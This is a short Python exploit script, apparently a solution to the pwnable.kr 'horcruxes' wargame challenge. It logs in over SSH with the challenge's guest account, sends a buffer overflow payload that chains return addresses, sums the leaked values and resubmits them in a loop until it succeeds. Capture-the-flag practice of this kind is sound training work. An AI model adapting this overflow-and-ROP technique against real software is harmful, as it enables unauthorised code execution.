from pwn import *

payload = 'a'*120 + p32(0x809fe4b) + p32(0x809fe6a) + p32(0x809fe89) + p32(0x809fea8) + p32(0x809fec7) + p32(0x809fee6) + p32(0x809ff05) + p32(0x809fffc)
res = "You'd better get more experience to kill Voldemort"
count = 0


def attack(payload, sum):
    p = ssh(host='pwnable.kr', user='horcruxes', port=2222, password='guest').connect_remote('0',9032)                      # fail then reconnect

    p.recvuntil('Select Menu:')
    p.sendline('1')
    p.recvuntil('earned? : ')
    p.sendline(payload)

    for i in range(7):
        print p.recvuntil('(EXP +')
        sum += int(p.recvline().replace(')',"").strip())

    p.recvuntil('Select Menu:')     # ropme agagin
    p.sendline('1')
    p.recvuntil('earned? : ')
    p.sendline(str(sum))
    return p.recv()

while ("You'd better get more experience to kill Voldemort" in res):
    res = attack(payload, 0)

log.success(res)
